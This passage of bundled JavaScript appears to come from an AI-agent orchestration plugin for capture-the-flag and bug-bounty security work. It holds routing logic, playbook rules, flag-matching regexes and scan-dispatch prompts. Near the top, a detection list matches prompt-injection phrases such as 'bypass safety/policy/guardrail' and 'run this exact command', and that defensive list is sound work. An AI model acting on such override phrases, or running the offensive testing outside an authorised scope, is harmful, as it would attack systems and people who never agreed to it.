  { id: "prompt_override", pattern: /(you\s+must|do\s+exactly|follow\s+only)\s+.*(instead|not\s+the\s+rules)/i },
  { id: "exact_command", pattern: /run\s+this\s+exact\s+command/i },
  { id: "policy_bypass", pattern: /bypass\s+(safety|policy|guardrail|restriction)/i }
];
function detectInjectionIndicators(text) {
  if (!text || text.trim().length === 0) {
    return [];
  }
  const matches = [];
  for (const item of INJECTION_PATTERNS) {
    if (item.pattern.test(text)) {
      matches.push(item.id);
    }
  }
  return matches;
}
function isVerificationSourceRelevant(toolName, title, options) {
  const normalizedToolName = toolName.toLowerCase();
  const normalizedTitle = (title ?? "").toLowerCase();
  const markerMatchedInTitle = options.verifierTitleMarkers.some((marker) => normalizedTitle.includes(marker.toLowerCase()));
  const isConfiguredVerifierTool = options.verifierToolNames.some((name) => name.toLowerCase() === normalizedToolName);
  if (!isConfiguredVerifierTool) {
    return markerMatchedInTitle;
  }
  if (normalizedToolName === "task" || normalizedToolName === "bash") {
    return markerMatchedInTitle;
  }
  return true;
}
var FLAG_EVIDENCE_PATTERNS = [
  /flag\{[^}\s]{1,200}\}/i,
  /ctf\{[^}\s]{1,200}\}/i,
  /picoctf\{[^}\s]{1,200}\}/i,
  /htb\{[^}\s]{1,200}\}/i,
  /tctf\{[^}\s]{1,200}\}/i,
  /seccon\{[^}\s]{1,200}\}/i,
  /asis\{[^}\s]{1,200}\}/i,
  /cctf\{[^}\s]{1,200}\}/i,
  /hxp\{[^}\s]{1,200}\}/i,
  /pctf\{[^}\s]{1,200}\}/i,
  /dice\{[^}\s]{1,200}\}/i,
  /uiuctf\{[^}\s]{1,200}\}/i,
  /ictf\{[^}\s]{1,200}\}/i,
  /actf\{[^}\s]{1,200}\}/i,
  /zer0pts\{[^}\s]{1,200}\}/i
];
var FAKE_PLACEHOLDER_RE = /(?:fake|placeholder|example|sample|dummy|mock|test[_-]?flag|not[_-]?real|decoy)/i;
function isLowConfidenceCandidate(candidate) {
  const trimmed = candidate.trim();
  if (!trimmed || trimmed.length < 6 || trimmed.length > 220) {
    return true;
  }
  const openBrace = trimmed.indexOf("{");
  const payload = openBrace >= 0 && trimmed.endsWith("}") ? trimmed.slice(openBrace + 1, -1) : trimmed;
  if (FAKE_PLACEHOLDER_RE.test(payload)) {
    return true;
  }
  const hasWhitespace = /\s/.test(trimmed);
  const hasBalancedBraces = trimmed.includes("{") && trimmed.endsWith("}");
  if (!hasBalancedBraces || hasWhitespace) {
    return true;
  }
  return false;
}
function extractVerifierEvidence(output, candidate) {
  const text = normalizeWhitespace(stripAnsi(output));
  const normalizedCandidate = (candidate ?? "").trim();
  if (normalizedCandidate.length > 0 && text.includes(normalizedCandidate)) {
    return normalizedCandidate;
  }
  for (const pattern of FLAG_EVIDENCE_PATTERNS) {
    const match = text.match(pattern);
    const raw = match?.[0]?.trim() ?? "";
    if (raw.length > 0) {
      return raw;
    }
  }
  return null;
}
function hasVerifierEvidence(output, candidate) {
  return extractVerifierEvidence(output, candidate) !== null;
}
var VERIFY_FAIL_STRICT_RE = /\b(?:wrong\s+answer|invalid\s+flag|rejected|incorrect|not\s+(?:flag\s+)?accepted|unaccepted|not\s+correct)\b/i;
var VERIFY_FAIL_GENERIC_RE = /\b(?:wrong!?|wrong\s+answer|incorrect|rejected|invalid\s+flag)\b/i;
var VERIFY_SUCCESS_STRICT_RE = /\b(?:flag\s+accepted|accepted!|correct!?)\b/i;
var VERIFY_SUCCESS_GENERIC_RE = /\b(?:accepted|correct!?)\b/i;
var VERIFY_SUCCESS_ORACLE_RE = /\b(?:correct!?|flag\s+accepted|accepted!?)\b/i;
var EXIT_CODE_ZERO_RE = /\b(?:exit(?:ed)?\s*(?:with)?\s*(?:code|status)?\s*[:=]?\s*0|return\s*code\s*[:=]?\s*0|rc\s*[:=]\s*0|status\s*[:=]\s*0)\b/i;
var RUNTIME_EVIDENCE_RE = /\b(?:docker|container|remote\s+runtime|remote\s+checker|challenge\s+host)\b/i;
function hasVerifyOracleSuccess(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  if (VERIFY_FAIL_STRICT_RE.test(text)) {
    return false;
  }
  return VERIFY_SUCCESS_ORACLE_RE.test(text);
}
function hasExitCodeZeroEvidence(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return EXIT_CODE_ZERO_RE.test(text);
}
function hasRuntimeEvidence(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return RUNTIME_EVIDENCE_RE.test(text);
}
var REV_VM_RISK_PATTERNS = [
  { signal: "rela_p", re: /\.rela\.p\b/i, weight: 0.35 },
  { signal: "sym_p", re: /\.sym\.p\b/i, weight: 0.2 },
  {
    signal: "reloc_anomaly",
    re: /\b(?:abnormal|weird|invalid|custom|nonstandard)\b[^\n]{0,60}\breloc(?:ation)?s?\b|\breloc(?:ation)?s?\b[^\n]{0,60}\b(?:abnormal|weird|invalid|custom|nonstandard)\b/i,
    weight: 0.2
  },
  { signal: "rwx_segment", re: /\brwx\b|\bwx\b/i, weight: 0.15 },
  { signal: "self_mod", re: /\bself[-\s]?mod(?:ifying)?\b/i, weight: 0.25 },
  { signal: "vm_hint", re: /\bvirtual\s+machine\b|\bbytecode\s+vm\b|\binterpreter\s+loop\b/i, weight: 0.25 }
];
function assessRevVmRisk(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  let score = 0;
  const signals = [];
  for (const item of REV_VM_RISK_PATTERNS) {
    if (item.re.test(text)) {
      score += item.weight;
      signals.push(item.signal);
    }
  }
  const capped = Math.min(1, score);
  const vmSuspected = capped >= 0.35 || signals.includes("self_mod") || signals.includes("vm_hint");
  const staticTrust = Math.max(0.2, 1 - capped * 0.7);
  return {
    vmSuspected,
    score: Number(capped.toFixed(3)),
    signals,
    staticTrust: Number(staticTrust.toFixed(3))
  };
}
function isVerifySuccess(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  if (VERIFY_FAIL_STRICT_RE.test(text)) {
    return false;
  }
  return VERIFY_SUCCESS_STRICT_RE.test(text) || VERIFY_SUCCESS_GENERIC_RE.test(text);
}
function isVerifyFailure(output) {
  const text = normalizeWhitespace(stripAnsi(output));
  return VERIFY_FAIL_STRICT_RE.test(text) || VERIFY_FAIL_GENERIC_RE.test(text);
}
var INTERACTIVE_COMMAND_PATTERNS = [
  { id: "git_rebase_i", pattern: /\bgit\s+rebase\s+(-[a-zA-Z]*i|--interactive)\b/, reason: "git rebase -i opens an interactive editor" },
  { id: "git_add_i", pattern: /\bgit\s+add\s+(-[a-zA-Z]*i|--interactive|-[a-zA-Z]*p|--patch)\b/, reason: "git add -i/--patch opens interactive prompts" },
  { id: "git_commit_no_msg", pattern: /\bgit\s+commit\b(?!.*(-m\s|--message[ =]))/, reason: "git commit without -m opens an editor; use -m 'msg'" },
  { id: "editor_vim", pattern: /\b(vim?|nvim|nano|emacs|pico|joe|micro)\b/, reason: "Interactive editor detected; use non-interactive alternatives" },
  { id: "less_more", pattern: /\|\s*(less|more)\s*$/, reason: "Pager detected; output will hang. Remove pipe to less/more" },
  { id: "interactive_python", pattern: /\bpython3?\s*$/, reason: "Bare python opens REPL; provide a script or use -c" },
  { id: "interactive_node", pattern: /\bnode\s*$/, reason: "Bare node opens REPL; provide a script or use -e" },
  { id: "ssh_no_cmd", pattern: /\bssh\s+[^|;&]+$/, reason: "ssh without a command opens an interactive shell" },
  { id: "interactive_flag", pattern: /\b(bash|sh|zsh)\s+(-[a-zA-Z]*i|--interactive)\b/, reason: "Interactive shell flag detected" }
];
function detectInteractiveCommand(command) {
  const cleaned = sanitizeCommand(command);
  for (const entry of INTERACTIVE_COMMAND_PATTERNS) {
    if (entry.pattern.test(cleaned)) {
      return { id: entry.id, reason: entry.reason };
    }
  }
  return null;
}
function sanitizeThinkingBlocks(text) {
  if (!text || text.trim().length === 0) {
    return null;
  }
  let modified = false;
  let result = text;
  const openCount = (result.match(/<thinking>/gi) || []).length;
  const closeCount = (result.match(/<\/thinking>/gi) || []).length;
  if (openCount > closeCount) {
    const diff = openCount - closeCount;
    for (let i = 0;i < diff; i++) {
      result = `${result}
</thinking>`;
    }
    modified = true;
  }
  if (closeCount > openCount) {
    let surplus = closeCount - openCount;
    result = result.replace(/<\/thinking>/gi, (match) => {
      if (surplus > 0) {
        surplus--;
        return "";
      }
      return match;
    });
    modified = true;
  }
  const thinkingPrefixRe = /^(thinking:\s*)/i;
  if (thinkingPrefixRe.test(result.trimStart()) && !result.includes("<thinking>")) {
    result = result.replace(thinkingPrefixRe, "");
    modified = true;
  }
  return modified ? result : null;
}

// src/orchestration/router.ts
function isStuck(state, config2) {
  const threshold = config2?.stuck_threshold ?? 2;
  return state.noNewEvidenceLoops >= threshold || state.samePayloadLoops >= threshold || state.verifyFailCount >= threshold;
}
function modeRouting(state, config2) {
  const routing = config2?.routing ?? DEFAULT_ROUTING;
  return state.mode === "CTF" ? routing.ctf : routing.bounty;
}
function contradictionPivotPrimary(state, config2) {
  const routing = modeRouting(state, config2);
  if (state.mode === "CTF" && (state.targetType === "PWN" || state.targetType === "REV")) {
    return "ctf-rev";
  }
  return routing.scan[state.targetType];
}
function hasObservationEvidence(state) {
  return state.verifyFailCount > 0 || state.noNewEvidenceLoops > 0 || state.samePayloadLoops > 0 || state.readonlyInconclusiveCount > 0 || state.failureReasonCounts.verification_mismatch > 0 || state.failureReasonCounts.hypothesis_stall > 0 || state.failureReasonCounts.static_dynamic_contradiction > 0;
}
function failureDrivenRoute(state, config2) {
  if (state.lastFailureReason === "context_overflow") {
    if (state.phase === "EXECUTE") {
      return {
        primary: modeRouting(state, config2).stuck[state.targetType],
        reason: "EXECUTE context overflow: keep solving route primary and use md-scribe as followup for compaction.",
        followups: ["md-scribe"]
      };
    }
    if (state.mdScribePrimaryStreak >= 2) {
      return {
        primary: modeRouting(state, config2).stuck[state.targetType],
        reason: "md-scribe guard: repeated context compaction route reached limit, pivot to target-aware stuck route."
      };
    }
    return {
      primary: "md-scribe",
      reason: "Recent failure indicates context overflow: compact state and retry with smaller context.",
      followups: [modeRouting(state, config2).stuck[state.targetType]]
    };
  }
  if (state.lastFailureReason === "verification_mismatch" && state.phase === "EXECUTE") {
    if (isStuck(state, config2)) {
      return {
        primary: modeRouting(state, config2).stuck[state.targetType],
        reason: "Repeated verification mismatches suggest a decoy or wrong constraints: stop re-verifying and pivot via stuck route."
      };
    }
    if (state.mode !== "CTF") {
      return {
        primary: "bounty-triage",
        reason: "Recent verification mismatch in BOUNTY: re-run minimal-impact reproducible triage before escalation."
      };
    }
    return {
      primary: "ctf-decoy-check",
      reason: "Recent verification mismatch: run decoy-check before next verification attempt.",
      followups: ["ctf-verify"]
    };
  }
  if (state.lastFailureReason === "tooling_timeout") {
    return {
      primary: modeRouting(state, config2).failover[state.targetType],
      reason: "Recent failure indicates timeout/quota pressure: use failover route."
    };
  }
  if (state.lastFailureReason === "exploit_chain") {
    return {
      primary: modeRouting(state, config2).stuck[state.targetType],
      reason: "Recent exploit-chain failure: pivot with target-specific stuck strategy."
    };
  }
  if (state.lastFailureReason === "hypothesis_stall" && isStuck(state, config2)) {
    if (state.staleToolPatternLoops >= 3 && state.noNewEvidenceLoops > 0) {
      return {
        primary: state.mode === "CTF" ? "ctf-hypothesis" : modeRouting(state, config2).stuck[state.targetType],
        reason: "Stale hypothesis kill-switch: repeated same tool/subagent pattern without new evidence. Cancel current line and switch to extraction/transform hypothesis.",
        followups: [modeRouting(state, config2).stuck[state.targetType]]
      };
    }
    return {
      primary: modeRouting(state, config2).stuck[state.targetType],
      reason: "Repeated no-evidence loop detected: force pivot via stuck route."
    };
  }
  if (state.lastFailureReason === "static_dynamic_contradiction") {
    if (!state.contradictionPatchDumpDone) {
      return {
        primary: contradictionPivotPrimary(state, config2),
        reason: "Static/dynamic contradiction hard-trigger: run one extraction-first pivot pass before further deep pivots.",
        followups: [modeRouting(state, config2).stuck[state.targetType]]
      };
    }
    return {
      primary: modeRouting(state, config2).stuck[state.targetType],
      reason: "Static/dynamic contradiction detected: force deep pivot via target stuck route."
    };
  }
  if (state.lastFailureReason === "unsat_claim") {
    const alternativesCount = state.alternatives.filter((item) => item.trim().length > 0).length;
    const evidenceReady = hasObservationEvidence(state);
    if (state.mode !== "CTF") {
      if (alternativesCount < 2 || !evidenceReady) {
        return {
          primary: "bounty-triage",
          reason: "UNSAT gate (BOUNTY): blocked until at least 2 alternatives and reproducible observation evidence exist; continue minimal-impact triage.",
          followups: [modeRouting(state, config2).stuck[state.targetType]]
        };
      }
      return {
        primary: modeRouting(state, config2).stuck[state.targetType],
        reason: "UNSAT gate (BOUNTY) satisfied: alternatives/evidence present; escalate via target-aware stuck route."
      };
    }
    if (alternativesCount < 2 || !evidenceReady) {
      return {
        primary: "ctf-hypothesis",
        reason: "UNSAT gate: blocked until at least 2 alternatives and internal observation evidence exist; continue hypothesis/disconfirm cycle.",
        followups: [modeRouting(state, config2).stuck[state.targetType]]
      };
    }
    return {
      primary: modeRouting(state, config2).stuck[state.targetType],
      reason: "UNSAT gate satisfied: alternatives/evidence present, pivot via stuck route for deep validation."
    };
  }
  return null;
}
function isRiskyCtfCandidate(state, config2) {
  const fastVerify = config2?.ctf_fast_verify;
  const riskyTargets = new Set(fastVerify?.risky_targets ?? ["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]);
  const enforceAllTargets = fastVerify?.enforce_all_targets ?? true;
  if (enforceAllTargets) {
    riskyTargets.add("WEB_API");
    riskyTargets.add("WEB3");
    riskyTargets.add("PWN");
    riskyTargets.add("REV");
    riskyTargets.add("CRYPTO");
    riskyTargets.add("FORENSICS");
    riskyTargets.add("MISC");
    riskyTargets.add("UNKNOWN");
  }
  const requireNonemptyCandidate = fastVerify?.require_nonempty_candidate ?? true;
  if (riskyTargets.has(state.targetType)) {
    return true;
  }
  if (state.verifyFailCount > 0 || state.noNewEvidenceLoops > 0 || state.samePayloadLoops > 0) {
    return true;
  }
  if (requireNonemptyCandidate && state.latestCandidate.trim().length === 0) {
    return true;
  }
  if (isLowConfidenceCandidate(state.latestCandidate)) {
    return true;
  }
  return false;
}
function route(state, config2) {
  const routing = modeRouting(state, config2);
  if (!state.contradictionPatchDumpDone && !(state.mode === "BOUNTY" && !state.scopeConfirmed)) {
    if (state.contradictionPivotDebt <= 0 && state.lastFailureReason === "static_dynamic_contradiction") {
      return {
        primary: contradictionPivotPrimary(state, config2),
        reason: "Contradiction pivot overdue: extraction-first pivot is mandatory now (loop budget exhausted).",
        followups: [routing.stuck[state.targetType]]
      };
    }
    if (state.contradictionPivotDebt > 0) {
      return {
        primary: contradictionPivotPrimary(state, config2),
        reason: `Contradiction pivot active: run extraction-first pivot within ${state.contradictionPivotDebt} dispatch loops.`,
        followups: [routing.stuck[state.targetType]]
      };
    }
  }
  if (state.contextFailCount >= 2 || state.timeoutFailCount >= 2) {
    if (state.phase === "EXECUTE") {
      return {
        primary: routing.stuck[state.targetType],
        reason: "EXECUTE timeout/context debt detected: keep solving route primary and run md-scribe only as followup compaction.",
        followups: ["md-scribe"]
      };
    }
    if (state.mdScribePrimaryStreak >= 2) {
      return {
        primary: routing.stuck[state.targetType],
        reason: "md-scribe guard: consecutive logging route threshold reached, pivot to target-aware stuck route instead of repeating md-scribe."
      };
    }
    return {
      primary: "md-scribe",
      reason: "Context/timeout failures exceeded threshold: compact and refresh durable notes before continuing.",
      followups: [routing.stuck[state.targetType]]
    };
  }
  if (state.mode === "BOUNTY" && !state.scopeConfirmed) {
    return {
      primary: "bounty-scope",
      reason: "BOUNTY mode requires scope confirmation before active validation."
    };
  }
  const failureRoute = failureDrivenRoute(state, config2);
  if (failureRoute) {
    return failureRoute;
  }
  if (state.candidatePendingVerification) {
    if (state.mode === "CTF") {
      if (state.lastFailureReason === "verification_mismatch") {
        return {
          primary: "ctf-decoy-check",
          reason: "Verification mismatch detected: run decoy-check before re-verify.",
          followups: ["ctf-verify"]
        };
      }
      const fastVerifyEnabled = config2?.ctf_fast_verify?.enabled ?? true;
      if (fastVerifyEnabled && !isRiskyCtfCandidate(state, config2)) {
        return {
          primary: "ctf-verify",
          reason: "Low-risk CTF candidate: run direct verification fast-path."
        };
      }
      return {
        primary: "ctf-decoy-check",
        reason: "Candidate found: run decoy check before official verification.",
        followups: ["ctf-verify"]
      };
    }
    return {
      primary: "bounty-triage",
      reason: "Candidate in BOUNTY requires minimal-impact reproducible verification."
    };
  }
  if (state.mode === "BOUNTY" && state.readonlyInconclusiveCount >= 2) {
    return {
      primary: "bounty-research",
      reason: "Two inconclusive read-only checks: escalate to safe CVE hypothesis research."
    };
  }
  if (isStuck(state, config2)) {
    return {
      primary: routing.stuck[state.targetType],
      reason: `Common stuck trigger: pivot using target-aware route '${routing.stuck[state.targetType]}'.`
    };
  }
  if (state.phase === "SCAN") {
    return {
      primary: routing.scan[state.targetType],
      reason: `Start in SCAN phase with target-aware route '${routing.scan[state.targetType]}'.`
    };
  }
  if (state.phase === "PLAN") {
    return {
      primary: routing.plan[state.targetType],
      reason: `PLAN phase: use '${routing.plan[state.targetType]}' for target-specific planning rigor.`,
      followups: [routing.execute[state.targetType]]
    };
  }
  return {
    primary: routing.execute[state.targetType],
    reason: "EXECUTE phase: follow plan-backed TODO list (one in_progress), then verify/log.",
    followups: state.mode === "CTF" ? ["ctf-verify"] : []
  };
}
function resolveFailoverAgent(originalAgent, errorText, config2) {
  const lowered = errorText.toLowerCase();
  const matched = config2.signatures.some((signature) => lowered.includes(signature.toLowerCase()));
  if (!matched) {
    return null;
  }
  if (originalAgent === "explore")
    return config2.map.explore;
  if (originalAgent === "librarian")
    return config2.map.librarian;
  if (originalAgent === "oracle")
    return config2.map.oracle;
  return null;
}

// src/orchestration/playbook.ts
var CTF_TARGET_RULES = {
  WEB_API: [
    "Use OWASP-style hypothesis and verify with reproducible request/response evidence.",
    "Treat UI-only changes as candidate until server-side state change is confirmed."
  ],
  WEB3: [
    "Validate on-chain effects against transaction/event evidence before claiming success.",
    "Assume web3-specific edge cases (reentrancy/allowance/oracle assumptions) and disconfirm cheaply first."
  ],
  PWN: [
    "Prioritize deterministic local exploit loop and prove shell/primitive with reproducible command output.",
    "Use built-in templates when helpful: ctf_orch_exploit_template_list / ctf_orch_exploit_template_get."
  ],
  REV: [
    "Use REV strategy ladder in order: static reconstruction -> dynamic validation -> contradiction-triggered patch-and-dump extraction -> loader internals last.",
    "If static/dynamic contradict, stop trace-only loops and extract runtime out/expected values first (patch-and-dump) before deeper semantics."
  ],
  CRYPTO: [
    "Use smallest disconfirming test vectors first; do not proceed on intuition-only parameter choices.",
    "Use built-in templates when helpful: ctf_orch_exploit_template_list / ctf_orch_exploit_template_get."
  ],
  FORENSICS: [
    "Confirm file/container types first and keep provenance for every extracted artifact.",
    "Treat OCR/strings-only findings as candidate until validated by structure or checker."
  ],
  MISC: [
    "Use quick disconfirm tests and escalate only on new evidence.",
    "OSINT workflows are intentionally grouped under MISC and require source-citable evidence."
  ],
  UNKNOWN: [
    "Start with broad scan, narrow to strongest hypothesis, then maintain a plan-backed TODO list.",
    "Do not claim solved status without verifier-aligned evidence."
  ]
};
var BOUNTY_TARGET_RULES = {
  WEB_API: [
    "Respect scope and use minimal-impact validation before any aggressive testing.",
    "Require reproducible request/response evidence and impact narrative."
  ],
  WEB3: [
    "Confirm scope (contracts/chains) and use read-only/state-safe checks first.",
    "Prefer simulation or non-destructive validation before broadcasting impactful transactions."
  ],
  PWN: [
    "Use controlled local reproduction and avoid destructive payloads.",
    "Demonstrate exploitability with least-impact proof aligned to program rules."
  ],
  REV: [
    "Keep reverse-engineering artifacts reproducible and tie findings to real exploit surface.",
    "Avoid unverifiable theoretical claims without runtime evidence."
  ],
  CRYPTO: [
    "Provide concrete break conditions and measurable security impact.",
    "Use conservative assumptions until validated by reproducible tests."
  ],
  FORENSICS: [
    "Maintain chain-of-custody style artifact notes and avoid modifying originals.",
    "Report only verified timeline/fact claims with source references."
  ],
  MISC: [
    "Stay scope-safe and impact-minimal; gather evidence before escalation.",
    "OSINT workflows are intentionally grouped under MISC and require source-citable evidence."
  ],
  UNKNOWN: [
    "Use triage-first mode and do not run high-risk actions before scope confidence.",
    "Escalate to research when two low-impact checks are inconclusive."
  ]
};
function buildTaskPlaybook(state, config2) {
  const header = "[oh-my-Aegis domain-playbook]";
  const rules = state.mode === "CTF" ? CTF_TARGET_RULES[state.targetType] : BOUNTY_TARGET_RULES[state.targetType];
  const lines = [
    header,
    `mode=${state.mode}`,
    `target=${state.targetType}`,
    "rules:",
    `- ${rules[0]}`,
    `- ${rules[1]}`
  ];
  if (state.targetType === "FORENSICS") {
    lines.push("- If you encounter images/PDFs, analyze with look_at before deeper binary parsing.");
  }
  if (state.targetType === "PWN" || state.targetType === "REV") {
    const interactiveEnabled = config2.interactive.enabled || config2.interactive.enabled_in_ctf;
    if (interactiveEnabled) {
      lines.push("- Use ctf_orch_pty_* tools for interactive workflows (gdb/nc) instead of blocking non-interactive bash.");
    }
    lines.push("- Container fidelity guard: when challenge requires docker/runtime parity, treat host-only experiments as reference and do not use them as final decision evidence.");
  }
  if (state.staleToolPatternLoops >= 3 && state.noNewEvidenceLoops > 0) {
    lines.push("- Stale hypothesis kill-switch active: cancel repeated tool pattern and generate a new extraction/transform hypothesis.");
  }
  if (!state.contradictionPatchDumpDone && state.contradictionPivotDebt > 0) {
    lines.push(`- Contradiction pivot active: run ONE extraction-first pivot within ${state.contradictionPivotDebt} dispatch loops and record artifact paths.`);
  }
  if (config2.sequential_thinking.enabled) {
    const targetOk = config2.sequential_thinking.activate_targets.includes(state.targetType);
    const phaseOk = config2.sequential_thinking.activate_phases.includes(state.phase);
    const stuckOk = config2.sequential_thinking.activate_on_stuck && isStuck(state, config2);
    const thinkingOk = !config2.sequential_thinking.disable_with_thinking_model || state.thinkMode === "none";
    if (thinkingOk && (targetOk && phaseOk || stuckOk)) {
      lines.push(`- Use ${config2.sequential_thinking.tool_name} to log sequential reasoning (branches/revisions) when planning or pivoting.`);
    }
  }
  lines.push("- Execute from your TODO list with one in_progress item and attach verifier-aligned evidence.");
  return lines.join(`
`);
}
function hasPlaybookMarker(prompt) {
  return prompt.includes("[oh-my-Aegis domain-playbook]");
}

// src/orchestration/parallel.ts
import { existsSync as existsSync4, mkdirSync, readFileSync as readFileSync4, renameSync, writeFileSync } from "fs";
import { dirname, join as join5 } from "path";
var groupsByParent = new Map;
var parallelStateFilePath = null;
function toPersistedTrack(track) {
  return {
    sessionID: track.sessionID,
    purpose: track.purpose,
    agent: track.agent,
    provider: track.provider,
    status: track.status,
    createdAt: track.createdAt,
    completedAt: track.completedAt,
    result: track.result,
    isWinner: track.isWinner
  };
}
function fromPersistedTrack(track) {
  return {
    ...track,
    prompt: ""
  };
}
function serializeGroups() {
  const groups = [];
  for (const [, parentGroups] of groupsByParent.entries()) {
    for (const group of parentGroups) {
      groups.push({
        parentSessionID: group.parentSessionID,
        label: group.label,
        tracks: group.tracks.map(toPersistedTrack),
        createdAt: group.createdAt,
        completedAt: group.completedAt,
        winnerSessionID: group.winnerSessionID,
        maxTracks: group.maxTracks
      });
    }
  }
  return {
    updatedAt: new Date().toISOString(),
    groups
  };
}
function loadPersistedGroups() {
  if (!parallelStateFilePath || !existsSync4(parallelStateFilePath)) {
    return;
  }
  try {
    const raw = readFileSync4(parallelStateFilePath, "utf-8");
    const parsed = JSON.parse(raw);
    const groups = Array.isArray(parsed?.groups) ? parsed.groups : [];
    groupsByParent.clear();
    for (const group of groups) {
      if (!group || typeof group !== "object")
        continue;
      const parentSessionID = typeof group.parentSessionID === "string" ? group.parentSessionID : "";
      if (!parentSessionID)
        continue;
      const tracksRaw = Array.isArray(group.tracks) ? group.tracks : [];
      const tracks = tracksRaw.filter((item) => Boolean(item) && typeof item === "object").map(fromPersistedTrack);
      const hydrated = {
        parentSessionID,
        label: typeof group.label === "string" ? group.label : "parallel",
        tracks,
        queue: [],
        parallel: {
          capDefault: 2,
          providerCaps: {},
          queueEnabled: true
        },
        createdAt: typeof group.createdAt === "number" ? group.createdAt : Date.now(),
        completedAt: typeof group.completedAt === "number" ? group.completedAt : 0,
        winnerSessionID: typeof group.winnerSessionID === "string" ? group.winnerSessionID : "",
        maxTracks: typeof group.maxTracks === "number" ? group.maxTracks : tracks.length
      };
      const existing = groupsByParent.get(parentSessionID) ?? [];
      existing.push(hydrated);
      groupsByParent.set(parentSessionID, existing);
    }
  } catch {
    return;
  }
}
function configureParallelPersistence(projectDir, rootDirName = ".Aegis") {
  parallelStateFilePath = join5(projectDir, rootDirName, "parallel_state.json");
  loadPersistedGroups();
}
function persistParallelGroups() {
  if (!parallelStateFilePath) {
    return;
  }
  try {
    mkdirSync(dirname(parallelStateFilePath), { recursive: true });
    const tmp = `${parallelStateFilePath}.tmp`;
    const payload = `${JSON.stringify(serializeGroups(), null, 2)}
`;
    writeFileSync(tmp, payload, "utf-8");
    renameSync(tmp, parallelStateFilePath);
  } catch {
    return;
  }
}
function getGroups(parentSessionID) {
  return groupsByParent.get(parentSessionID) ?? [];
}
function getActiveGroup(parentSessionID) {
  const groups = getGroups(parentSessionID);
  if (groups.length === 0)
    return null;
  const last = groups[groups.length - 1];
  if (last.completedAt > 0)
    return null;
  return last;
}
function getAllGroups() {
  return groupsByParent;
}
var TARGET_SCAN_AGENTS = {
  WEB_API: "ctf-web",
  WEB3: "ctf-web3",
  PWN: "ctf-pwn",
  REV: "ctf-rev",
  CRYPTO: "ctf-crypto",
  FORENSICS: "ctf-forensics",
  MISC: "ctf-explore",
  UNKNOWN: "ctf-explore"
};
function providerIdFromModel3(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function providerForAgent(agent) {
  const model = agentModel(agent);
  if (!model)
    return "unknown";
  const provider = providerIdFromModel3(model);
  return provider || "unknown";
}
function planScanDispatch(state, config2, challengeDescription) {
  const target = state.targetType;
  if (state.mode === "BOUNTY") {
    const bountyBasePrompt = challengeDescription.trim() ? `[Parallel SCAN track]

Target:
${challengeDescription.slice(0, 2000)}

` : `[Parallel SCAN track]

`;
    if (!state.scopeConfirmed) {
      return {
        tracks: [
          {
            purpose: "scope-first",
            agent: "bounty-scope",
            prompt: `${bountyBasePrompt}` + "Scope is not confirmed. Perform scope confirmation and safe target framing only. " + "Do not run active validation."
          }
        ],
        label: "scan-bounty-scope"
      };
    }
    const bountyScanAgent = config2.routing.bounty.scan[target] ?? "bounty-triage";
    const bountyScan = config2.parallel.bounty_scan;
    const maxTracks = bountyScan.max_tracks;
    const triageTracks = bountyScan.triage_tracks;
    const researchTracks = bountyScan.research_tracks;
    const scopeRecheckTracks = bountyScan.scope_recheck_tracks;
    const requestedTracks = triageTracks + researchTracks + scopeRecheckTracks;
    const tracks2 = [];
    const addTrack = (purposePrefix, agent, count, promptText) => {
      for (let i = 0;i < count; i += 1) {
        const index = count > 1 ? `-${i + 1}` : "";
        tracks2.push({
          purpose: `${purposePrefix}${index}`,
          agent,
          prompt: `${bountyBasePrompt}${promptText}`
        });
      }
    };
    if (requestedTracks <= 0) {
      addTrack("surface-triage", bountyScanAgent, 1, "Run scope-safe surface triage in parallel. Prioritize read-only reconnaissance and minimal-impact evidence collection. Output top 5 observations and one safest next action.");
      addTrack("bounty-research", "bounty-research", 1, "Research target-relevant vulnerability classes and known patterns. Return top 3 hypotheses with cheapest low-impact validation for each.");
      addTrack("scope-recheck", "bounty-scope", 1, "Re-validate in-scope boundaries, assets, and safe testing constraints. List explicit must-not-do actions before execution phase.");
    } else {
      addTrack("surface-triage", bountyScanAgent, triageTracks, "Run scope-safe surface triage in parallel. Prioritize read-only reconnaissance and minimal-impact evidence collection. Output top 5 observations and one safest next action.");
      addTrack("bounty-research", "bounty-research", researchTracks, "Research target-relevant vulnerability classes and known patterns. Return top 3 hypotheses with cheapest low-impact validation for each.");
      addTrack("scope-recheck", "bounty-scope", scopeRecheckTracks, "Re-validate in-scope boundaries, assets, and safe testing constraints. List explicit must-not-do actions before execution phase.");
    }
    return { tracks: tracks2.slice(0, maxTracks), label: `scan-bounty-${target.toLowerCase()}` };
  }
  const domainAgent = TARGET_SCAN_AGENTS[target] ?? "ctf-explore";
  const basePrompt = challengeDescription.trim() ? `[Parallel SCAN track]

Challenge:
${challengeDescription.slice(0, 2000)}

` : `[Parallel SCAN track]

`;
  const tracks = [
    {
      purpose: "fast-recon",
      agent: "ctf-explore",
      prompt: `${basePrompt}Perform fast initial reconnaissance. Identify file types, protections, strings, basic structure. Output SCAN.md-style summary with top 5 observations. Do NOT attempt to solve yet.`
    },
    {
      purpose: `domain-scan-${target.toLowerCase()}`,
      agent: domainAgent,
      prompt: `${basePrompt}Perform domain-specific deep scan for ${target} target. Focus on attack surface, vulnerability patterns, and tool-specific analysis (e.g., checksec for PWN, endpoint enumeration for WEB_API). Output structured observations.`
    },
    {
      purpose: "research-cve",
      agent: "ctf-research",
      prompt: `${basePrompt}Research known CVEs, CTF writeups, and exploitation techniques relevant to this challenge. Search for similar challenges, framework/library versions, and known vulnerability patterns. Return top 3 hypotheses with cheapest disconfirm test for each.`
    }
  ];
  if (domainAgent === "ctf-explore") {
    tracks.splice(1, 1);
  }
  return { tracks, label: `scan-${target.toLowerCase()}` };
}
function planHypothesisDispatch(state, config2, hypotheses) {
  const agent = state.mode === "CTF" ? config2.routing.ctf.execute[state.targetType] ?? "aegis-exec" : !state.scopeConfirmed ? "bounty-scope" : config2.routing.bounty.execute[state.targetType] ?? "aegis-exec";
  const tracks = hypotheses.slice(0, 3).map((h, i) => ({
    purpose: `hypothesis-${i + 1}`,
    agent,
    prompt: [
